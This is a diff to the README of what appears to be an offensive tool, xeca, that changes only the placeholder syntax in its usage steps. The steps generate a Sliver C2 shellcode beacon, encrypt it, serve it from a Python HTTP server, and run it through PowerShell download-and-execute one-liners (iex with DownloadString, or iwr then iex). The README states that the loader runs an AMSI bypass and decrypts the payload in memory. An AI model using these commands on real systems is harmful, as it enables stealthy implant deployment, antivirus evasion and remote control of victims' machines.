@@ -37,12 +37,12 @@ If users must have access to programs such as powershell.exe, consider minimisin
 
 ## Usage
 ### Sliver
-1. Generate a shellcode beacon -> generate beacon --format shellcode --os windows --mtls <IP>
-2. Use xeca to encrypt the payload -> xeca shellcode --shellcode <shellcode>.bin --url http://<pythonhttpserver>
+1. Generate a shellcode beacon -> generate beacon --format shellcode --os windows --mtls $IP$
+2. Use xeca to encrypt the payload -> xeca shellcode --shellcode $shellcode$.bin --url http://$pythonhttpserver$
 3. Create a python http server with the port that you provided to xeca -> python -m http.server 8080
 4. Use one of the following ways to run the payload:
-    - Fileless -> iex(New-Object Net.WebClient).DownloadString("http://<pythonhttpserver>/launch.txt")
-    - Run from disk -> iwr "http://<pythonhttpserver>" -OutFile launch.txt; iex(cat .\launch.txt)
+    - Fileless -> iex(New-Object Net.WebClient).DownloadString("http://$pythonhttpserver$/launch.txt")
+    - Run from disk -> iwr "http://$pythonhttpserver$" -OutFile launch.txt; iex(cat .\launch.txt)
 
 The launch.txt file contains the encrypted payload, it will first run an amsi bypass, and then it will load the encrypted payload, after that it will call back to the python server and grab the "safe.txt" file which will decrypt the payload in memory.
 
